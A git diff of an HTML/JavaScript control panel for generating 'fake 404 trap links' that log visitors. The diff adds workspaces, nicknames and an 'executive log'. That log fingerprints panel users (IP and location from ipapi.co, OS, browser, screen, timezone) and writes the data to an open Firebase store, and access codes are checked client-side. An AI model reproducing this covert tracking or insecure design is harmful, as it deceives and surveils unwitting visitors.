@@ -142,7 +142,7 @@ ul.devlist li:last-child{border-bottom:none}
   <div style="display:flex;flex-direction:column;align-items:center;gap:4px;margin-bottom:28px">
     <div style="font-size:1.35rem;font-weight:800;letter-spacing:.12em;color:#fff">SC6</div>
     <div style="font-size:.58rem;font-weight:600;letter-spacing:.2em;color:rgba(255,255,255,.22);text-transform:uppercase">Control Panel</div>
-    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.4.1</div>
+    <div style="font-size:.6rem;font-weight:500;letter-spacing:.1em;color:rgba(192,0,14,.6);font-family:'Manrope',sans-serif;margin-top:2px">v1.4.5</div>
   </div>
   <div class="home-btns">
     <button class="home-btn" id="btnDev">
@@ -154,6 +154,7 @@ ul.devlist li:last-child{border-bottom:none}
       <span class="home-btn-arrow">›</span>
     </button>
   </div>
+  <div style="margin-top:28px;font-size:.62rem;font-weight:600;letter-spacing:.12em;color:rgba(192,0,14,.5);text-transform:uppercase">Made by Puro &lt;3</div>
 </div>
 
 <!-- ══════════ DEV PANEL ══════════ -->
@@ -181,6 +182,23 @@ ul.devlist li:last-child{border-bottom:none}
 
   <!-- Dev content (shown after auth) -->
   <div id="devContent" style="display:none">
+
+    <section>
+      <div class="sec-head"><h3>Workspace</h3><p class="note" style="margin:4px 0 0">Your workspace determines which error links you see. Each workspace is isolated.</p></div>
+      <div class="sec-body">
+        <div class="row">
+          <span class="label">Current: <code id="devSyncDisplay" style="color:#f5c800;background:rgba(255,200,0,.1);padding:1px 6px;border-radius:3px;font-size:.78rem">—</code></span>
+        </div>
+        <div class="row">
+          <input type="text" id="devSyncInput" maxlength="40" placeholder="Enter workspace code…" style="flex:1">
+          <button class="btn-sm" id="devSyncApply">Apply</button>
+        </div>
+        <div class="row">
+          <button class="btn-sm" id="devSyncGenerate">Generate new code</button>
+          <button class="btn-sm danger" id="devSyncReset">Reset to default</button>
+        </div>
+      </div>
+    </section>
 
     <section>
       <div class="sec-head"><h3>Error links</h3><p class="note" style="margin:4px 0 0">Generate fake 404 trap links. Visitors are logged.</p></div>
@@ -297,6 +315,48 @@ ul.devlist li:last-child{border-bottom:none}
       </div>
     </section>
 
+    <!-- Code nicknames -->
+    <section>
+      <div class="sec-head"><h3>Code nicknames</h3><p class="note" style="margin:4px 0 0">Give each dev code a name — shown in the executive log.</p></div>
+      <div class="sec-body">
+        <ul class="devlist" id="opNicknameList"><li style="color:#888">Loading…</li></ul>
+        <div class="row" style="margin-top:8px">
+          <input type="text" id="opNicknameCode" maxlength="32" placeholder="Code…" style="flex:1">
+          <input type="text" id="opNicknameName" maxlength="24" placeholder="Name…" style="flex:1">
+          <button class="btn-sm" id="opNicknameAdd">Save</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Workspace log -->
+    <section>
+      <div class="sec-head"><h3>Workspace log</h3><p class="note" style="margin:4px 0 0">Every time a dev user sets or generates a workspace code.</p></div>
+      <div class="sec-body">
+        <ul class="devlist" id="opSyncLog"><li style="color:#888">Loading…</li></ul>
+        <div class="row" style="margin-top:10px">
+          <button class="btn-sm danger" id="opSyncLogClear">Clear log</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- Executive log -->
+    <section>
+      <div class="sec-head">
+        <h3>Executive log</h3>
+        <p class="note" style="margin:4px 0 0">Every action by everyone — syncs every 3 seconds.</p>
+      </div>
+      <div class="sec-body">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px">
+          <span id="execLogStatus" style="font-size:.65rem;color:#555">●</span>
+          <span style="font-size:.65rem;color:#555" id="execLogCount"></span>
+          <span style="flex:1"></span>
+          <button class="btn-sm" id="execLogPause" style="font-size:.65rem">Pause</button>
+          <button class="btn-sm danger" id="execLogClear" style="font-size:.65rem">Clear</button>
+        </div>
+        <ul class="devlist" id="execLogList" style="max-height:420px;overflow-y:auto;padding-right:2px"><li style="color:#888">Loading…</li></ul>
+      </div>
+    </section>
+
   </div>
 </div>
 
@@ -335,8 +395,29 @@ function syncFetch(url,opts){
   return fetch(url,Object.assign({headers:{'Content-Type':'application/json'}},opts||{}));
 }
 
+// ── Sync code (workspace) ──
+var DEFAULT_SYNC='void-alpha';
+var _syncCode=null;
+var _currentDevCode='?';
+function getSyncCode(){
+  if(_syncCode)return _syncCode;
+  try{var s=localStorage.getItem('sc6_syncCode');if(s){_syncCode=s;return s;}}catch(e){}
+  return DEFAULT_SYNC;
+}
+function setSyncCode(c,logIt){
+  _syncCode=c||DEFAULT_SYNC;
+  try{if(c&&c!==DEFAULT_SYNC)localStorage.setItem('sc6_syncCode',c);else localStorage.removeItem('sc6_syncCode');}catch(e){}
+  if(logIt){
+    var entry={time:new Date().toISOString(),code:_syncCode,by:_currentDevCode,tag:deviceTag()};
+    var url=fbUrl('_sc6/workspaceLog');
+    fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
+      var list=Array.isArray(d)?d:[];list.push(entry);if(list.length>500)list=list.slice(-500);
+      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(list)}).catch(function(){});
+    });
+  }
+}
+
 // ── URL factories ──
-function ns(){return getSyncCode()}
 function operatorLogUrl(){return fbUrl('_sc6/operatorLog')}
 function devPasswordsUrl(){return fbUrl('_sc6/devPasswords')}
 function devBansUrl(){return fbUrl('_sc6/devBans')}
@@ -344,8 +425,8 @@ function devLockedUrl(){return fbUrl('_sc6/devLocked')}
 function devMainDisabledUrl(){return fbUrl('_sc6/devMainDisabled')}
 function devAltDisabledUrl(){return fbUrl('_sc6/devAltDisabled')}
 function devMessageUrl(){return fbUrl('_sc6/devMessage')}
-function trapLinksUrl(){return fbUrl('_sc6/trapLinks')}
-function trapLogsUrl(id){return fbUrl('_sc6/trapLogs'+(id?'/'+id:''))}
+function trapLinksUrl(){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/trapLinks')}
+function trapLogsUrl(id){return fbUrl('_sc6/workspaces/'+getSyncCode()+'/trapLogs'+(id?'/'+id:''))}
 function trapGenEnabledUrl(){return fbUrl('_sc6/trapGenEnabled')}
 function trapLinksEnabledUrl(){return fbUrl('_sc6/trapLinksEnabled')}
 var ERROR_PAGE_BASE=location.origin+location.pathname.replace(/[^/]*$/,'')+'error.html';
@@ -364,16 +445,125 @@ function deviceTag(){
   }catch(e){return'Unknown'}
 }
 
+// ══════════════════════════════════════════
+// EXECUTIVE LOG
+// ══════════════════════════════════════════
+var _execLogPaused=false;
+var _execLogInterval=null;
+var _execIpCache=null; // {ip,country,region} once fetched
+
+function execLogUrl(){return fbUrl('_sc6/execLog')}
+
+function getIpInfo(cb){
+  if(_execIpCache){cb(_execIpCache);return;}
+  fetch('https://ipapi.co/json/',{cache:'no-store'}).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(j){
+    if(j){_execIpCache={ip:j.ip||'?',country:j.country_name||'?',region:j.region||''};}
+    else{_execIpCache={ip:'?',country:'?',region:''};}
+    cb(_execIpCache);
+  });
+}
+
+function exLog(action,detail,who){
+  getIpInfo(function(geo){
+    var n=navigator,ua=n.userAgent;
+    var entry={
+      t:new Date().toISOString(),
+      action:action,
+      detail:detail||'',
+      who:who||'unknown',
+      tag:deviceTag(),
+      ip:geo.ip,
+      country:geo.country,
+      region:geo.region||'',
+      os:(function(){if(/Windows/.test(ua))return'Win';if(/Android/.test(ua))return'Android';if(/iPhone|iPad|iPod/.test(ua)||(navigator.platform==='MacIntel'&&navigator.maxTouchPoints>1))return'iOS';if(/Mac/.test(ua))return'Mac';if(/Linux/.test(ua))return'Linux';return'?';}()),
+      br:(function(){var m;if(m=ua.match(/Edg\/([\d.]+)/))return'Edge '+m[1].split('.')[0];if(m=ua.match(/OPR\/([\d.]+)/))return'Opera '+m[1].split('.')[0];if(m=ua.match(/(?:Chrome|CriOS)\/([\d.]+)/))return'Chrome '+m[1].split('.')[0];if(m=ua.match(/(?:Firefox|FxiOS)\/([\d.]+)/))return'FF '+m[1].split('.')[0];if(m=ua.match(/Version\/([\d.]+).*Safari/))return'Safari '+m[1].split('.')[0];return'?';}())
+    };
+    var url=execLogUrl();
+    fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
+      var list=Array.isArray(d)?d:[];
+      list.push(entry);
+      if(list.length>2000)list=list.slice(-2000);
+      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(list)}).catch(function(){});
+    });
+  });
+}
+
+var _execLogLastCount=0;
+function renderExLog(){
+  if(_execLogPaused)return;
+  var ul=document.getElementById('execLogList');
+  if(!ul)return;
+  fetch(execLogUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(data){
+    if(_execLogPaused)return;
+    var arr=Array.isArray(data)?data:[];
+    var count=document.getElementById('execLogCount');
+    if(count)count.textContent=arr.length+' events';
+    var status=document.getElementById('execLogStatus');
+    if(arr.length!==_execLogLastCount){if(status)status.style.color='#f5c800';}
+    else{if(status)status.style.color='#555';}
+    _execLogLastCount=arr.length;
+    if(!arr.length){ul.innerHTML='<li style="color:#666">No events yet.</li>';return;}
+    var rev=arr.slice().reverse();
+    var wasAtBottom=ul.scrollTop+ul.clientHeight>=ul.scrollHeight-10;
+    ul.innerHTML=rev.map(function(e){
+      var d=new Date(e.t);
+      var ts=isNaN(d)?e.t:d.toLocaleTimeString()+' '+d.toLocaleDateString();
+      var whoRaw=e.who||'?';
+      // Extract code from "dev XXXX" for nickname lookup
+      var devCode=whoRaw.startsWith('dev ')?whoRaw.slice(4):null;
+      var whoLabel=devCode?nameFor(devCode):whoRaw;
+      var whoColor=whoRaw==='operator'?'#ff6b6b':whoRaw.startsWith('dev ')?'#f5c800':whoRaw==='visitor'?'#4fc':'#aaa';
+      var actionColor=e.action&&e.action.startsWith('ERR')?'#ff6b6b':'#eee';
+      return '<li style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,.05);font-size:.7rem">'
+        +'<div style="display:flex;gap:6px;align-items:flex-start;flex-wrap:wrap">'
+        +'<span style="color:'+whoColor+';font-weight:700;min-width:52px;text-transform:uppercase;font-size:.62rem">'+esc(whoLabel)+'</span>'
+        +'<span style="color:'+actionColor+';flex:1;word-break:break-word">'+esc(e.action||'?')+'</span>'
+        +'<span style="color:#555;white-space:nowrap;font-size:.62rem">'+esc(ts)+'</span>'
+        +'</div>'
+        +(e.detail?'<div style="color:#888;font-size:.65rem;padding-left:60px;margin-top:1px;word-break:break-all">'+esc(e.detail)+'</div>':'')
+        +'<div style="color:#444;font-size:.6rem;padding-left:60px">'+esc(e.os||'')+(e.br?' · '+esc(e.br):'')+(e.ip?' · '+esc(e.ip):'')+(e.country?' '+esc(e.country):'')+(e.tag?' · '+esc(e.tag):'')+'</div>'
+        +'</li>';
+    }).join('');
+    if(wasAtBottom)ul.scrollTop=ul.scrollHeight;
+  });
+}
+
+function startExLogSync(){
+  if(_execLogInterval)return;
+  renderExLog();
+  _execLogInterval=setInterval(function(){if(!_execLogPaused)renderExLog();},3000);
+}
+function stopExLogSync(){
+  if(_execLogInterval){clearInterval(_execLogInterval);_execLogInterval=null;}
+}
+
 // ── Log operator access ──
 function logOpAccess(which){
-  var entry={time:new Date().toISOString(),tag:deviceTag(),code:which};
-  var url=operatorLogUrl();
-  fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
-    var list=Array.isArray(d)?d:[];
-    list.push(entry);
-    if(list.length>200)list=list.slice(-200);
-    return syncFetch(url,{method:'PUT',body:JSON.stringify(list)});
-  }).catch(function(){});
+  var n=navigator,ua=n.userAgent;
+  function osName(u,pl){if(/Windows/.test(u))return'Windows';if(/Android/.test(u))return'Android';if(/iPhone|iPad|iPod/.test(u)||(pl==='MacIntel'&&n.maxTouchPoints>1))return'iOS/iPadOS';if(/Mac/.test(u))return'macOS';if(/CrOS/.test(u))return'ChromeOS';if(/Linux/.test(u))return'Linux';return'Unknown';}
+  function brName(u){var m;if(m=u.match(/Edg\/([\d.]+)/))return'Edge '+m[1];if(m=u.match(/OPR\/([\d.]+)/))return'Opera '+m[1];if(m=u.match(/SamsungBrowser\/([\d.]+)/))return'Samsung Internet '+m[1];if(m=u.match(/(?:Firefox|FxiOS)\/([\d.]+)/))return'Firefox '+m[1];if(m=u.match(/(?:Chrome|CriOS)\/([\d.]+)/))return'Chrome '+m[1];if(m=u.match(/Version\/([\d.]+).*Safari/))return'Safari '+m[1];return'Unknown';}
+  var entry={
+    time:new Date().toISOString(),
+    tag:deviceTag(),
+    code:which,
+    os:osName(ua,n.platform),
+    browser:brName(ua),
+    screen:screen.width+'×'+screen.height,
+    lang:n.language||'?',
+    tz:Intl&&Intl.DateTimeFormat?Intl.DateTimeFormat().resolvedOptions().timeZone:'?',
+    ua:ua,
+    country:'Unknown',ip:null
+  };
+  fetch('https://ipapi.co/json/',{cache:'no-store'}).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(j){
+    if(j){entry.ip=j.ip||null;entry.country=j.country_name||'Unknown';entry.region=j.region||'';}
+    var url=operatorLogUrl();
+    fetch(url).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
+      var list=Array.isArray(d)?d:[];
+      list.push(entry);
+      if(list.length>200)list=list.slice(-200);
+      fetch(url,{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(list)}).catch(function(){});
+    });
+  });
 }
 
 // ── Nav ──
@@ -405,19 +595,57 @@ document.getElementById('opBack').addEventListener('click',function(){
   document.getElementById('opGate').style.display='';
   document.getElementById('opContent').style.display='none';
   document.getElementById('opCodeInput').value='';
+  stopExLogSync();
   show(null);
 });
 
 // ══════════════════════════════════════════
 // DEV PANEL AUTH
 // ══════════════════════════════════════════
-function openDev(){
+function openDev(whichCode){
+  _currentDevCode=whichCode||'?';
   document.getElementById('devGate').style.display='none';
   document.getElementById('devContent').style.display='';
+  exLog('Dev panel opened','Code: '+_currentDevCode,'dev '+_currentDevCode);
+  renderDevSync();
   loadDevTrapList();
   loadDevMessage();
   refreshDevTrapStatus();
 }
+function renderDevSync(){
+  var sc=getSyncCode();
+  document.getElementById('devSyncDisplay').textContent=sc;
+  document.getElementById('devSyncInput').value=(sc===DEFAULT_SYNC?'':sc);
+}
+
+document.getElementById('devSyncApply').addEventListener('click',function(){
+  var val=document.getElementById('devSyncInput').value.trim();
+  if(!val){alert('Enter a workspace code first.');return;}
+  setSyncCode(val,true);
+  exLog('Workspace applied','Code set to: '+val,'dev '+_currentDevCode);
+  renderDevSync();
+  loadDevTrapList();
+  alert('Workspace set to: '+val);
+});
+
+document.getElementById('devSyncGenerate').addEventListener('click',function(){
+  var words=['alpha','beta','gamma','delta','echo','foxtrot','zeta','nova','cipher','phantom','solar','neon','void','static','flux','arc'];
+  var code=words[Math.floor(Math.random()*words.length)]+'-'+Math.random().toString(36).slice(2,6)+'-'+Math.random().toString(36).slice(2,5);
+  setSyncCode(code,true);
+  exLog('Workspace generated','New code: '+code,'dev '+_currentDevCode);
+  renderDevSync();
+  loadDevTrapList();
+  navigator.clipboard.writeText(code).catch(function(){});
+  alert('New workspace code generated:\n'+code+'\n\n(Copied to clipboard)');
+});
+
+document.getElementById('devSyncReset').addEventListener('click',function(){
+  if(!confirm('Reset workspace to default ('+DEFAULT_SYNC+')?\nYou will see the default shared links.'))return;
+  setSyncCode(DEFAULT_SYNC,false);
+  exLog('Workspace reset','Back to default: '+DEFAULT_SYNC,'dev '+_currentDevCode);
+  renderDevSync();
+  loadDevTrapList();
+});
 
 function loadDevMessage(){
   fetch(devMessageUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
@@ -436,17 +664,17 @@ function tryDevCode(){
   if(!val)return;
   // Check lock
   fetch(devLockedUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(locked){
-    if(locked===true){shake(inp);inp.value='';return;}
+    if(locked===true){exLog('Dev login blocked','Panel is locked','unknown');shake(inp);inp.value='';return;}
     if(val===DEV_CODE){
       fetch(devMainDisabledUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(v){
         if(v===true){shake(inp);inp.value='';}
-        else{logOpAccess('main ('+DEV_CODE+')');openDev();}
+        else{logOpAccess('main ('+DEV_CODE+')');openDev('main');}
       });return;
     }
     if(val===DEV_CODE_ALT){
       fetch(devAltDisabledUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(v){
         if(v===true){shake(inp);inp.value='';}
-        else{logOpAccess('alt ('+DEV_CODE_ALT+')');openDev();}
+        else{logOpAccess('alt ('+DEV_CODE_ALT+')');openDev('alt');}
       });return;
     }
     // Check extra passwords
@@ -455,8 +683,8 @@ function tryDevCode(){
       var match=arr.find(function(e){return e.code===val;});
       if(match){
         if(match.disabled===true){shake(inp);inp.value='';}
-        else{logOpAccess('extra ('+val+')');openDev();}
-      }else{shake(inp);inp.value='';}
+        else{logOpAccess('extra ('+val+')');openDev(val);}
+      }else{exLog('Dev login failed','Wrong code entered','unknown');shake(inp);inp.value='';}
     });
   });
 }
@@ -477,6 +705,7 @@ function tryOpCode(){
     inp.value='';
     document.getElementById('opGate').style.display='none';
     document.getElementById('opContent').style.display='';
+    exLog('Operator panel opened','','operator');
     loadOpAll();
   } else {
     shake(inp);inp.value='';
@@ -485,6 +714,9 @@ function tryOpCode(){
 
 function loadOpAll(){
   renderOpLog();
+  renderOpSyncLog();
+  loadOpNicknames();
+  startExLogSync();
   refreshOpTrapGenStatus();
   refreshOpTrapLinksStatus();
   loadOpTrapList();
@@ -500,21 +732,134 @@ function renderOpLog(){
   fetch(operatorLogUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(data){
     var arr=Array.isArray(data)?data.slice().reverse():[];
     if(!arr.length){ul.innerHTML='<li style="color:#888">No entries yet.</li>';return;}
-    ul.innerHTML=arr.map(function(e){
+    ul.innerHTML=arr.map(function(e,idx){
       var codeCol=e.code&&e.code.indexOf('main')!==-1?'#4eff8a':e.code&&e.code.indexOf('alt')!==-1?'#f5c800':e.code?'#aaa':'#555';
+      var did='ald-'+idx;
+      var loc=[(e.country||''),(e.region||'')].filter(Boolean).join(', ')||'Unknown';
       return '<li style="padding:5px 0;border-bottom:1px solid rgba(255,255,255,.07)">'
         +'<div style="display:flex;align-items:baseline;gap:6px;flex-wrap:wrap">'
         +'<span style="color:#ccc;font-size:.75rem;font-weight:600">'+esc(new Date(e.time).toLocaleString())+'</span>'
-        +'<span style="color:'+codeCol+';font-size:.7rem;font-family:monospace;background:rgba(255,255,255,.05);padding:1px 6px;border-radius:4px">'+esc(e.code||'?')+'</span>'
+        +'<span style="color:'+codeCol+';font-size:.7rem;font-family:monospace;background:rgba(255,255,255,.05);padding:1px 6px;border-radius:4px">'+esc((function(){var c=e.code||'?';var m=c.match(/\(([^)]+)\)$/);return m?c.replace(m[0],'('+nameFor(m[1])+')')  :c;})())+'</span>'
+        +(e.country?'<span style="color:#f5c800;font-size:.68rem">'+esc(e.country)+'</span>':'')
+        +(e.ip?'<span style="color:#555;font-size:.65rem">'+esc(e.ip)+'</span>':'')
+        +'<button onclick="var d=document.getElementById(\''+did+'\');d.style.display=d.style.display===\'none\'?\'block\':\'none\'" style="background:none;border:1px solid rgba(255,255,255,.18);border-radius:4px;color:#aaa;font-size:.62rem;padding:1px 6px;cursor:pointer;margin-left:auto">details</button>'
         +'</div>'
         +'<div style="color:#666;font-size:.68rem;margin-top:1px">'+esc(e.tag||'?')+'</div>'
+        +'<div id="'+did+'" style="display:none;margin-top:5px;background:rgba(0,0,0,.35);border-radius:6px;padding:5px 8px">'
+        +[['OS',e.os||'—'],['Browser',e.browser||'—'],['Screen',e.screen||'—'],['Language',e.lang||'—'],['Timezone',e.tz||'—'],['IP',e.ip||'—'],['Location',loc]].map(function(r){
+          return '<div style="display:flex;gap:5px;padding:2px 0;border-bottom:1px solid rgba(255,255,255,.04)">'
+            +'<span style="color:#555;font-size:.64rem;min-width:64px;flex-shrink:0">'+r[0]+'</span>'
+            +'<span style="color:#ccc;font-size:.68rem;word-break:break-all">'+esc(r[1])+'</span></div>';
+        }).join('')
+        +(e.ua?'<div style="margin-top:3px;color:#444;font-size:.6rem;word-break:break-all;line-height:1.3">'+esc(e.ua)+'</div>':'')
+        +'</div>'
         +'</li>';
     }).join('');
   });
 }
 document.getElementById('opLogClear').addEventListener('click',function(){
   if(!confirm('Clear the entire access log?'))return;
-  syncFetch(operatorLogUrl(),{method:'DELETE'}).then(function(){renderOpLog();}).catch(function(e){alert('Failed: '+e.message);});
+  syncFetch(operatorLogUrl(),{method:'DELETE'}).then(function(){exLog('Access log cleared','','operator');renderOpLog();}).catch(function(e){alert('Failed: '+e.message);});
+});
+
+// ── Code nicknames ──
+var _nicknames={}; // {code: name} — loaded from Firebase + cached in memory
+
+function nicknamesUrl(){return fbUrl('_sc6/codeNicknames')}
+
+function loadNicknames(cb){
+  fetch(nicknamesUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(d){
+    _nicknames=(d&&typeof d==='object'&&!Array.isArray(d))?d:{};
+    if(cb)cb(_nicknames);
+  });
+}
+
+function nameFor(code){
+  var n=_nicknames[code];
+  return n?code+' ('+n+')':code;
+}
+
+function loadOpNicknames(){
+  loadNicknames(function(map){
+    var ul=document.getElementById('opNicknameList');
+    var entries=Object.keys(map);
+    if(!entries.length){ul.innerHTML='<li style="color:#888">No nicknames set.</li>';return;}
+    ul.innerHTML=entries.map(function(code){
+      return '<li style="display:flex;align-items:center;gap:8px">'
+        +'<code style="color:#f5c800;font-size:.78rem;flex:1">'+esc(code)+'</code>'
+        +'<span style="color:#ccc;font-size:.8rem;flex:1">'+esc(map[code])+'</span>'
+        +'<button class="btn-sm danger" style="font-size:.65rem;padding:2px 8px" data-nick-del="'+esc(code)+'">Remove</button>'
+        +'</li>';
+    }).join('');
+    ul.querySelectorAll('[data-nick-del]').forEach(function(btn){
+      btn.addEventListener('click',function(){
+        var code=btn.getAttribute('data-nick-del');
+        var updated=Object.assign({},_nicknames);
+        delete updated[code];
+        fetch(nicknamesUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(updated)})
+          .then(function(){exLog('Nickname removed','Code: '+code,'operator');loadOpNicknames();})
+          .catch(function(e){alert('Failed: '+e.message);});
+      });
+    });
+  });
+}
+
+document.getElementById('opNicknameAdd').addEventListener('click',function(){
+  var code=document.getElementById('opNicknameCode').value.trim();
+  var name=document.getElementById('opNicknameName').value.trim();
+  if(!code||!name){alert('Enter both a code and a name.');return;}
+  var updated=Object.assign({},_nicknames);
+  updated[code]=name;
+  fetch(nicknamesUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(updated)})
+    .then(function(){
+      exLog('Nickname set',code+' → '+name,'operator');
+      document.getElementById('opNicknameCode').value='';
+      document.getElementById('opNicknameName').value='';
+      loadOpNicknames();
+    })
+    .catch(function(e){alert('Failed: '+e.message);});
+});
+
+// ── Workspace log ──
+function renderOpSyncLog(){
+  var ul=document.getElementById('opSyncLog');
+  ul.innerHTML='<li style="color:#888">Loading…</li>';
+  fetch(fbUrl('_sc6/workspaceLog')).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(data){
+    if(!Array.isArray(data)||!data.length){ul.innerHTML='<li style="color:#666">No entries yet.</li>';return;}
+    var arr=data.slice().reverse();
+    ul.innerHTML=arr.map(function(e){
+      var d=new Date(e.time);
+      var ts=isNaN(d)?e.time:(d.toLocaleDateString()+' '+d.toLocaleTimeString());
+      return '<li style="padding:7px 0;border-bottom:1px solid rgba(255,255,255,.06)">'
+        +'<div style="display:flex;justify-content:space-between;align-items:center;gap:8px">'
+        +'<code style="color:#f5c800;background:rgba(255,200,0,.1);padding:1px 6px;border-radius:3px;font-size:.78rem;word-break:break-all">'+esc(e.code||'?')+'</code>'
+        +'<span style="font-size:.65rem;color:#888;white-space:nowrap">'+esc(ts)+'</span>'
+        +'</div>'
+        +'<div style="font-size:.7rem;color:#aaa;margin-top:3px">By: <code style="color:#ccc">'+esc(nameFor(e.by||'?'))+'</code>'
+        +(e.tag?' · <span style="color:#777">'+esc(e.tag)+'</span>':'')+'</div>'
+        +'</li>';
+    }).join('');
+  });
+}
+document.getElementById('opSyncLogClear').addEventListener('click',function(){
+  if(!confirm('Clear the workspace log?'))return;
+  fetch(fbUrl('_sc6/workspaceLog'),{method:'DELETE',headers:{'Content-Type':'application/json'}}).then(function(){renderOpSyncLog();}).catch(function(e){alert('Failed: '+e.message);});
+});
+
+// ── Executive log controls ──
+document.getElementById('execLogPause').addEventListener('click',function(){
+  _execLogPaused=!_execLogPaused;
+  this.textContent=_execLogPaused?'Resume':'Pause';
+  this.style.color=_execLogPaused?'#f5c800':'';
+  if(!_execLogPaused)renderExLog();
+});
+document.getElementById('execLogClear').addEventListener('click',function(){
+  if(!confirm('Clear the entire executive log? This cannot be undone.'))return;
+  exLog('EXEC LOG CLEARED','All entries deleted by operator','operator');
+  setTimeout(function(){
+    fetch(execLogUrl(),{method:'DELETE',headers:{'Content-Type':'application/json'}})
+      .then(function(){renderExLog();}).catch(function(e){alert('Failed: '+e.message);});
+  },800);
 });
 
 // ── Lock ──
@@ -530,7 +875,7 @@ document.getElementById('opToggleLock').addEventListener('click',function(){
   fetch(devLockedUrl()).then(function(r){return r.ok?r.json():null}).catch(function(){return null}).then(function(v){
     var on=v===true;
     if(!on&&!confirm('Lock the Dev panel? No one (even with a valid code) can open it until you unlock here.'))return;
-    syncFetch(devLockedUrl(),{method:'PUT',body:JSON.stringify(!on)}).then(function(){refreshOpLock();}).catch(function(e){alert('Failed: '+e.message);});
+    syncFetch(devLockedUrl(),{method:'PUT',body:JSON.stringify(!on)}).then(function(){exLog('Dev panel '+(on?'unlocked':'locked'),'','operator');refreshOpLock();}).catch(function(e){alert('Failed: '+e.message);});
   });
 });
 
@@ -538,10 +883,10 @@ document.getElementById('opToggleLock').addEventListener('click',function(){
 document.getElementById('opMsgLeave').addEventListener('click',function(){
   var txt=prompt('Message for the Dev panel (shown on next login):');
   if(!txt||!txt.trim())return;
-  syncFetch(devMessageUrl(),{method:'PUT',body:JSON.stringify({text:txt.trim(),time:new Date().toISOString()})}).then(function(){alert('Message saved.');}).catch(function(e){alert('Failed: '+e.message);});
+  syncFetch(devMessageUrl(),{method:'PUT',body:JSON.stringify({text:txt.trim(),time:new Date().toISOString()})}).then(function(){exLog('Dev message set',txt.trim().slice(0,80),'operator');alert('Message saved.');}).catch(function(e){alert('Failed: '+e.message);});
 });
 document.getElementById('opMsgDelete').addEventListener('click',function(){
-  syncFetch(devMessageUrl(),{method:'DELETE'}).then(function(){alert('Message deleted.');}).catch(function(e){alert('Failed: '+e.message);});
+  syncFetch(devMessageUrl(),{method:'DELETE'}).then(function(){exLog('Dev message deleted','','operator');alert('Message deleted.');}).catch(function(e){alert('Failed: '+e.message);});
 });
 
 // ── Passwords ──
@@ -611,7 +956,7 @@ function loadOpPasswords(){
         tmBtn.textContent='…';
         fetch(devMainDisabledUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(newVal)})
           .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.json();})
-          .then(function(){loadOpPasswords();})
+          .then(function(){exLog('Password '+(newVal?'disabled':'enabled'),'Main code (built-in)','operator');loadOpPasswords();})
           .catch(function(e){tmBtn.disabled=false;tmBtn.textContent=mainOff?'Enable':'Disable';fbPutError(e.message);});
       });
     }
@@ -622,7 +967,7 @@ function loadOpPasswords(){
         taBtn.textContent='…';
         fetch(devAltDisabledUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(newVal)})
           .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.json();})
-          .then(function(){loadOpPasswords();})
+          .then(function(){exLog('Password '+(newVal?'disabled':'enabled'),'Alt code (built-in)','operator');loadOpPasswords();})
           .catch(function(e){taBtn.disabled=false;taBtn.textContent=altOff?'Enable':'Disable';fbPutError(e.message);});
       });
     }
@@ -632,11 +977,13 @@ function loadOpPasswords(){
       btn.addEventListener('click',function(){
         var idx=parseInt(btn.getAttribute('data-pass-toggle'));
         var arr=extras.map(function(e){return{code:e.code,disabled:e.disabled};});
+        var targetCode=arr[idx].code;
         arr[idx].disabled=!arr[idx].disabled;
+        var nowDisabled=arr[idx].disabled;
         btn.disabled=true;
         fetch(devPasswordsUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(arr)})
           .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.json();})
-          .then(function(){loadOpPasswords();})
+          .then(function(){exLog('Password '+(nowDisabled?'disabled':'enabled'),'Code: '+targetCode,'operator');loadOpPasswords();})
           .catch(function(e){btn.disabled=false;fbPutError(e.message);});
       });
     });
@@ -663,11 +1010,12 @@ function loadOpPasswords(){
         clearTimeout(armTimer);
         var idx=parseInt(btn.getAttribute('data-pass-rm'));
         var arr=extras.map(function(e){return{code:e.code,disabled:e.disabled};});
+        var removedCode=arr[idx].code;
         arr.splice(idx,1);
         btn.disabled=true;
         fetch(devPasswordsUrl(),{method:'PUT',headers:{'Content-Type':'application/json'},body:JSON.stringify(arr)})
           .then(function(r){if(!r.ok)throw new Error('HTTP '+r.status);return r.json();})
-          .then(function(){loadOpPasswords();})
+          .then(function(){exLog('Password deleted','Code: '+removedCode,'operator');loadOpPasswords();})
           .catch(function(e){btn.disabled=false;fbPutError(e.message);});
       });
     });
@@ -684,7 +1032,7 @@ document.getElementById('opPassAdd').addEventListener('click',function(){
     arr.push({code:val,disabled:false});
